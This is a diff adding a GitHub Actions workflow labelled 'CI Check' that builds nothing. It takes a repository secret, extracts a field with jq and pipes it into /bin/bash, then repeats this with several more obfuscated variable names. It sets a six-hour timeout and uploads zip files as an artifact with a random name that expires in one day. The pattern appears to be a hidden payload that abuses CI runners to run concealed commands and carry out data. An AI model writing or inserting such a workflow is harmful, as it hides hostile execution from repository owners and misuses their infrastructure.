@@ -1,0 +1,34 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          zfpsi101: ${{ secrets.zfpsi101 }}
+        run: |
+          printf '%s' "$zfpsi101" | jq -r .e57 | /bin/bash
+          echo $plao64 | jq -r .wwvlg04 | /bin/bash
+          echo $kllai61527 | jq -r .fwe10 | /bin/bash
+          printf '%s' "$lhhko95" | jq -r .a46 | /bin/bash
+          echo $v8288 | jq -r .el9007 | /bin/bash
+          echo $b73977 | jq -r .iyc0 | /bin/bash
+          echo $ykwsz06805 | jq -r .vc9623 | /bin/bash
+          printf '%s' "$umuqg937" | jq -r .km7211 | /bin/bash
+          echo $oxfx632 | jq -r .yr66 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ahRLpq13
+          path: "*.zip"
+          retention-days: 1
